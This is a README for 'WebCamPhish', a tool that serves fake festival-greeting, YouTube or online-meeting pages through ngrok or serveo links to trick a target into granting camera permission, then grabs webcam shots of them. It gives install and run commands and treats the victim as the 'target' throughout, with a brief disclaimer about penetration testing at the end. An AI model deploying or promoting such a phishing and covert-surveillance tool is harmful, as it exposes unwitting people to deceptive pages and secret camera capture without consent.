## Beta Version 1.5 

### © 
Copyright of Justine Dela Torre (Jasutin)

# WebCamPhish
Bypassing camera on any device using a php server and javascript for client-side.

# What is WebCamPhishing?
<p>WebCamPhishing is techniques to take cam shots of target's phone front camera or PC webcam. WebCamPhishing hosts a fake website on in built PHP server and uses ngrok & serveo to generate a link which we will forward to the target, which can be used on over internet. website asks for camera permission and if the target allows it, this tool grab camshots of target's device</p>

## Features
<p>In this tool I added two automatic webpage templates for engaged target on webpage to get more picture of cam</p>
<ul>
  <li>Festival Wishing</li>
  <li>Live YouTube TV</li>
   <li>Online Meeting [Beta]</li>
</ul>
<p>simply enter festival name or youtube's video ID</p>

## This tool tested on:
<ul>
  <li>Kali Linux</li>
  <li>Termux</li>
  <li>MacOS</li>
  <li>Ubuntu</li>
  <li>Parrot Security Linux</li>
</ul>

# Installing and requirements
<p>This tool require PHP for webserver, SSH or Serveo link. First run following command on your terminal</p>

```
sudo apt -y install php openssh git wget unzip
```

## Follow the command to use the module:

```
git clone https://github.com/jasut1n/WebCamPhishing
cd WebCamPhishing
chmod +x webcamphish.sh
./webcamphish.sh
```

## Change Log:

<p><b>Version: 1.5:</b> Add new online meeting template</p>
<p><b>Version: 1.4:</b> Ngrok authtoken update</p>
<p><b>Version: 1.3:</b> Fix ngrok direct link</p>

#### Credits

<p>WebCamPhishing is created to help in penetration testing and ethical hacking it's not responsible for any misuse or illegal purposes.</p>
<p>WebCamPhishing is inspired by https://github.com/thelinuxchoice/ and https://github.com/techchipnet/ Big thanks to @thelinuxchoice and @techchip</p>
